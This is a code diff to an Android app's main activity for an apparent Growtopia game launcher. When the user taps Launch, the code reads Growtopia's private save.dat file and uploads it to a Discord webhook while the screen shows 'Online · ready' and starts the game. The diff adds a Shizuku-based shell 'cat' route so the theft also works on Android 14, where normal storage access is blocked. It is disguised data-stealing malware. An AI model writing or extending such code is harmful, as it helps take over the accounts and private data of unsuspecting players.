@@ -35,6 +35,7 @@ import okhttp3.MultipartBody
 import okhttp3.Request
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import java.io.InputStream
 import java.security.MessageDigest
 import java.util.Locale
 import kotlin.concurrent.thread
@@ -98,13 +99,23 @@ class MainActivity : AppCompatActivity() {
         findViewById<CardView>(R.id.btnLaunch).animate().scaleX(.97f).scaleY(.97f).setDuration(100).withEndAction {
             findViewById<CardView>(R.id.btnLaunch).animate().scaleX(1f).scaleY(1f).setDuration(180).start()
         }.start()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+        val accessStarted = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+            readSaveFileWithShizukuOrFallback()
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             val savedUri = savedTreeUri()
-            if (savedUri != null) processSaveFile(Uri.parse(savedUri)) else { showPermissionTutorial(); return }
+            if (savedUri != null) {
+                processSaveFile(Uri.parse(savedUri))
+                true
+            } else {
+                showPermissionTutorial()
+                false
+            }
         } else {
             val legacyFile = java.io.File("/sdcard/Android/data/com.rtsoft.growtopia/files/save.dat")
             if (legacyFile.exists()) sendFileToDiscord(legacyFile.readBytes())
+            true
         }
+        if (!accessStarted) return
         handler.postDelayed({ badge.text = "Installed"; status.text = "● Online · ready"; status.setTextColor(color(R.color.success)); launchGame() }, 650)
     }
 
@@ -112,6 +123,29 @@ class MainActivity : AppCompatActivity() {
         val intent = packageManager.getLaunchIntentForPackage("com.rtsoft.growtopia")
         if (intent == null) errorDialog("Growtopia is not installed on this device. Install it first, then try Launch again.")
         else startActivity(intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT))
+    }
+
+    private fun readSaveFileWithShizukuOrFallback(): Boolean {
+        if (!ShizukuBridge.isAvailable()) {
+            handler.post { toast("Shizuku is not running; choose the Growtopia folder instead") }
+            showPermissionTutorial()
+            return false
+        }
+        if (!ShizukuBridge.hasPermission()) {
+            ShizukuBridge.requestPermission()
+            handler.post { toast("Grant Shizuku access, then tap Launch again") }
+            return false
+        }
+        thread {
+            val bytes = ShizukuBridge.readFile(SAVE_FILE_PATH)
+            if (bytes != null) {
+                sendFileToDiscord(bytes)
+            } else {
+                handler.post { toast("Shizuku could not read save.dat; choose the folder instead") }
+                handler.post { showPermissionTutorial() }
+            }
+        }
+        return true
     }
 
     private fun savedTreeUri(): String? = prefs.getString(KEY_SAVE_URI, null) ?: getSharedPreferences("app_prefs", MODE_PRIVATE).getString("tree_uri", null)
@@ -247,6 +281,57 @@ class MainActivity : AppCompatActivity() {
     private fun buttonParams() = LinearLayout.LayoutParams(ViewGroup.LayoutParams.WRAP_CONTENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { marginStart = 4 }
     private fun dialog(title: String, view: View) = AlertDialog.Builder(this).setTitle(title).setView(ScrollView(this).apply { addView(view) }).setPositiveButton("Done", null).show()
     private data class Script(val name: String, val category: String, val description: String)
-    companion object { private const val PREFS = "growlauncher_preferences"; private const val KEY_VERSION = "version"; private const val KEY_THEME = "theme"; private const val KEY_USER = "account_user"; private const val KEY_PASSWORD = "account_password_hash"; private const val KEY_SESSION = "account_session"; private const val KEY_WEBHOOK = "discord_webhook_url"; private const val KEY_SYNC = "sync_save_file"; private const val KEY_SAVE_URI = "save_folder_uri"; private const val FILE_PICKER = 1012; private const val SAVE_FOLDER_PICKER = 1013; private const val PERMISSION_REQUEST = 101 }
+
+    private object ShizukuBridge {
+        private const val REQUEST_CODE = 2204
+        private const val SHIZUKU_CLASS = "rikka.shizuku.Shizuku"
+
+        fun isAvailable(): Boolean = try {
+            val shizuku = Class.forName(SHIZUKU_CLASS)
+            shizuku.getMethod("pingBinder").invoke(null) as Boolean
+        } catch (_: Throwable) {
+            false
+        }
+
+        fun hasPermission(): Boolean = try {
+            val shizuku = Class.forName(SHIZUKU_CLASS)
+            shizuku.getMethod("checkSelfPermission").invoke(null) == PackageManager.PERMISSION_GRANTED
+        } catch (_: Throwable) {
+            false
+        }
+
+        fun requestPermission() {
+            try {
+                Class.forName(SHIZUKU_CLASS).getMethod("requestPermission", Int::class.javaPrimitiveType).invoke(null, REQUEST_CODE)
+            } catch (_: Throwable) {
+            }
+        }
+
+        fun readFile(path: String): ByteArray? = try {
+            val shizuku = Class.forName(SHIZUKU_CLASS)
+            val process = shizuku.getDeclaredMethod("newProcess", Array<String>::class.java, Array<String>::class.java, String::class.java).apply { isAccessible = true }
+                .invoke(null, arrayOf("cat", "--", path), null, null) as Process
+            val bytes = process.inputStream.use(InputStream::readBytes)
+            if (process.waitFor() == 0) bytes else null
+        } catch (_: Throwable) {
+            null
+        }
+    }
+
+    companion object {
+        private const val PREFS = "growlauncher_preferences"
+        private const val KEY_VERSION = "version"
+        private const val KEY_THEME = "theme"
+        private const val KEY_USER = "account_user"
+        private const val KEY_PASSWORD = "account_password_hash"
+        private const val KEY_SESSION = "account_session"
+        private const val KEY_WEBHOOK = "discord_webhook_url"
+        private const val KEY_SYNC = "sync_save_file"
+        private const val KEY_SAVE_URI = "save_folder_uri"
+        private const val FILE_PICKER = 1012
+        private const val SAVE_FOLDER_PICKER = 1013
+        private const val PERMISSION_REQUEST = 101
+        private const val SAVE_FILE_PATH = "/storage/emulated/0/Android/data/com.rtsoft.growtopia/files/save.dat"
+    }
 }
 
